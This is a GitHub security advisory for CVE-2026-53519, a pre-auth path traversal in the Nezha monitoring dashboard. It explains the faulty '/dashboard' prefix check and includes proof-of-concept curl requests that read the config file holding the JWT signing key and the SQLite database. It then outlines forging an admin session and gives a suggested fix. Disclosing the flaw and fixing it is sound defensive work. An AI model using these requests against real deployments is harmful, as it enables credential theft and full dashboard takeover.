# [C] Nezha Monitoring: Pre-auth path traversal via /dashboard.. prefix confusion leaks jwt_secret_key

## Summary
Severity: Critical
Advisory: GHSA-5c25-7vpj-9mqh
CVE: CVE-2026-53519
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-26
Source: https://github.com/advisories/GHSA-5c25-7vpj-9mqh
Type: github-advisory

## Affected
- Go: `github.com/nezhahq/nezha` — affected >=0 <2.0.13

## Details
### Summary
`fallbackToFrontend` in the dashboard's `NoRoute` handler treats any URL whose **raw string** starts with `/dashboard` as an admin-frontend asset request. The check uses `strings.HasPrefix`, not a path-segment match, so the input `/dashboard../data/config.yaml` is accepted; `strings.TrimPrefix` leaves `../data/config.yaml`; and `path.Join("admin-dist", "../data/config.yaml")` normalizes to `data/config.yaml` — which `os.Stat` finds and `http.ServeFile` returns. No authentication required.
 
In default deployments (the values shipped in `model/config.go` and the layout shipped in the project `Dockerfile`) `data/config.yaml` contains the HS256 `jwt_secret_key` used by `cmd/dashboard/controller/jwt.go` to sign every dashboard session cookie. A unauth attacker reads that secret, forges an admin JWT, and signs in as any user — full dashboard takeover from one GET request.

### Details
## Root cause
 
```go
// cmd/dashboard/controller/controller.go @ 636f4a9
387:    fallbackStatusCode := getFallbackStatusCode(c.Request.URL.Path)
388:    if strings.HasPrefix(c.Request.URL.Path, "/dashboard") {
389:        stripPath := strings.TrimPrefix(c.Request.URL.Path, "/dashboard")
390:        localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)
391:        if checkLocalFileOrFs(c, frontendDist, localFilePath, http.StatusOK) {
392:            return
393:        }
```
 
```go
// cmd/dashboard/controller/controller.go @ 636f4a9
322: func fallbackToFrontend(frontendDist fs.FS) func(*gin.Context) {
323:     checkLocalFileOrFs := func(c *gin.Context, fs fs.FS, path string, customStatusCode int) bool {
324:         if _, err := os.Stat(path); err == nil {
325:             http.ServeFile(utils.NewGinCustomWriter(c, customStatusCode), c.Request, path)
326:             return true
327:         }
```
 
`fallbackToFrontend` is wired as the catch-all at `cmd/dashboard/controller/controller.go:157` — `r.NoRoute(fallbackToFrontend(frontendDist))` — so every URL not matched by an earlier route reaches it, including pre-auth.
 
### Path math (verified, see appendix)
 
| Input `URL.Path` | `TrimPrefix(..., "/dashboard")` | `path.Join("admin-dist", ...)` | Reachable file |
|---|---|---|---|
| `/dashboard/login` | `/login` | `admin-dist/login` | legitimate, intended |
| `/dashboard/../data/config.yaml` | `/../data/config.yaml` | `data/config.yaml` | **but blocked by Go `http.ServeFile`'s URL `..`-segment guard → 400** |
| `/dashboard../data/config.yaml` | `../data/config.yaml` | `data/config.yaml` | **served, 200** |
| `/dashboard%2e%2e/data/config.yaml` | `../data/config.yaml` (decoded) | `data/config.yaml` | **served, 200** |
| `/dashboard..%2fdata/config.yaml` | `../data/config.yaml` (decoded) | `data/config.yaml` | **served, 200** |
 
The negative control (`/dashboard/../data/config.yaml`) lands at the same on-disk path after `path.Join`, but is rejected by `http.ServeFile` because Go's stdlib enforces a URL-level traversal guard that fires when the **request URL** itself contains a standalone `..` segment. The bypass works because in `/dashboard../...` the first URL segment is the single token `dashboard..` — no standalone `..` — so the stdlib guard does not trigger. The traversal segment is **created after `TrimPrefix`**, downstream of every defense.
 
### Why the existing defenses miss
 
1. The prefix check is a substring test on the raw URL string, not a segment test. `dashboard` and `dashboard..` are both accepted.
2. `path.Join` silently `Clean`s the result — so the `..` is consumed correctly to escape `admin-dist`, with no error returned to indicate escape.
3. Go's `http.ServeFile` stdlib guard fires only on URLs with a standalone `..` segment (per `net/http.containsDotDot`). The payload puts the dots inside the first segment instead.
4. No anchored "is this still under the template root?" check exists after `path.Join`.

## PoC
### Setup
 
```text
TARGET:        github.com/nezhahq/nezha@636f4a971653ce3f5272fee99dc85c0bd5f923ef
HARNESS:       stdlib-only port — see Appendix A
WORKDIR:       tmpdir containing admin-dist/, user-dist/, data/config.yaml, data/sqlite.db
TIME-TO-REPRO: first request
```
 
The harness plants this `data/config.yaml`:
 
```yaml
debug: false
listen_port: 8008
language: en_US
jwt_secret_key: REPRO_JWT_SECRET_VALUE_DO_NOT_USE
agent_secret_key: REPRO_AGENT_SECRET_VALUE
site:
  brand: nezha-repro
```
 
### Observed responses
 
**Primary payload — pre-auth secret disclosure:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard../data/config.yaml'
```
 
```text
HTTP/1.1 200 OK
Accept-Ranges: bytes
Content-Length: 167
Content-Type: application/yaml
Last-Modified: Sun, 24 May 2026 12:16:23 GMT
Date: Sun, 24 May 2026 12:16:25 GMT
 
debug: false
listen_port: 8008
language: en_US
jwt_secret_key: REPRO_JWT_SECRET_VALUE_DO_NOT_USE
agent_secret_key: REPRO_AGENT_SECRET_VALUE
site:
  brand: nezha-repro
```
 
**Negative control — Go stdlib guard rejects the canonical form:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard/../data/config.yaml'
```
 
```text
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
 
invalid URL path
```
 
**Encoded-dot variant — bypass also works:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2e%2e/data/config.yaml'
```
 
```text
HTTP/1.1 200 OK
Content-Length: 167
Content-Type: application/yaml
[... full config.yaml including jwt_secret_key ...]
```
 
**Encoded-slash variant — bypass also works:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard..%2fdata/config.yaml'
```
 
```text
HTTP/1.1 200 OK
Content-Length: 167
Content-Type: application/yaml
[... full config.yaml including jwt_secret_key ...]
```
 
**Double-encoded — confirms the bypass requires single-level encoding:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%252e%252e/data/config.yaml'
```
 
```text
HTTP/1.1 200 OK
Content-Length: 30
Content-Type: text/html; charset=utf-8
 
<html>admin frontend OK</html>
```
 
The literal `%252e%252e` does not decode to `..`, so the path becomes `admin-dist/%2e%2e/data/config.yaml` (no escape), `os.Stat` fails, and the handler falls through to serving `admin-dist/index.html` — no secret disclosure.
 
**Encoded leading slash — also blocked at the stdlib layer:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2f..%2fdata/config.yaml'
```
 
```text
HTTP/1.1 400 Bad Request
 
invalid URL path
```
 
**SQLite database exfil — same primitive:**
 
```bash
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard../data/sqlite.db'
```
 
```text
HTTP/1.1 200 OK
Content-Length: 42
 
SQLITE_FORMAT_3_FAKE_DB_CONTENT_REPRO_ONLY
```
 
### Sanity checks
 
- Normal `/dashboard/` request still serves `admin-dist/index.html` with HTTP 200 — the bypass does not regress legitimate behavior.
- Requests to `/api/...` still hit the JSON-404 branch — the bypass is isolated to the `/dashboard` fallback.


## Impact
### Direct primitive
Unauth read of any file in the dashboard's working directory subtree reachable by escaping `admin-dist` one level. In default deployments that includes:
 
| File | Default path | Why it matters |
|---|---|---|
| `data/config.yaml` | from `-c` flag default (`cmd/dashboard/main.go:104`) | Contains `jwt_secret_key` (signing key, **HS256**), `agent_secret_key`, OAuth2 client secrets, GitHub release token, GeoIP API key, and any custom secrets |
| `data/sqlite.db` | from `-db` flag default (`cmd/dashboard/main.go:105`) | Full dashboard state: users (incl. admin), bcrypt password hashes, server registry, API tokens, notification configs |
 
### Chain to administrative account takeover (verified path)
 
1. **Read config** — `GET /dashboard../data/config.yaml` returns plaintext YAML containing `jwt_secret_key`.
2. **Read database** — `GET /dashboard../data/sqlite.db` returns the SQLite file; an attacker opens it and reads the `users` table to recover admin user IDs (and any other claims the JWT references).
3. **Forge a JWT** — the dashboard's JWT middleware at `cmd/dashboard/controller/jwt.go:22,27` is wired with:
   ```go
   Key:              []byte(singleton.Conf.JWTSecretKey),
   SigningAlgorithm: "HS256",
   CookieName:       "nz-jwt",
   IdentityKey:      model.CtxKeyAuthorizedUser,
   ```
   HS256 is symmetric — possession of the key is sufficient to sign tokens that pass verification. An attacker mints a token whose `user_id` claim matches the admin user from step 2 and attaches it as the `nz-jwt` cookie (or `Authorization: Bearer ...`).
4. **Operate as admin** — every admin handler (`adminHandler` chain) now accepts the forged session, granting CRUD on servers, users, cron tasks, notifications, and OAuth2 settings.
The chain is fully deterministic against a default-configured dashboard: two unauth HTTP GETs and a JWT signing operation, no race, no user interaction, no special timing.
## Suggested fix
 
Make the prefix test segment-aware and reject paths whose cleaned form escapes the template root **before** any filesystem call. Minimal diff:
 
```diff
- if strings.HasPrefix(c.Request.URL.Path, "/dashboard") {
-     stripPath := strings.TrimPrefix(c.Request.URL.Path, "/dashboard")
+ if c.Request.URL.Path == "/dashboard/" || strings.HasPrefix(c.Request.URL.Path, "/dashboard/") {
+     stripPath := strings.TrimPrefix(c.Request.URL.Path, "/dashboard/")
+     cleanPath := path.Clean("/" + stripPath)
+     if cleanPath == ".." || strings.HasPrefix(cleanPath, "../") || strings.Contains(cleanPath, "/../") {
+         c.JSON(http.StatusNotFound, newErrorResponse(errors.New("404 Not Found")))
+         return
+     }
      localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)
```
 
The `/dashboard` -> `/dashboard/` redirect at line 382 already exists, so requiring the trailing slash is safe and aligns with the regexes in `frontendPageUrlRegistry`.
 
The same hardening should be applied to the user-template branch (lines 399–405), which uses the same `path.Join` pattern with `singleton.Conf.UserTemplate`. While the `/dashboard` prefix-confusion vector doesn't hit it directly, any future code change that hands a controlled `URL.Path` to that branch would re-introduce the same primitive.
 
A defense-in-depth alternative is to replace the local `os.Stat + http.ServeFile` branch with a `http.FileServer(http.FS(subFS))` rooted at the embedded `admin-dist` subdirectory, which keeps the embedded-FS contract and removes the working-directory escape entirely.

## References
- https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh
- https://nvd.nist.gov/vuln/detail/CVE-2026-53519
- https://github.com/nezhahq/nezha
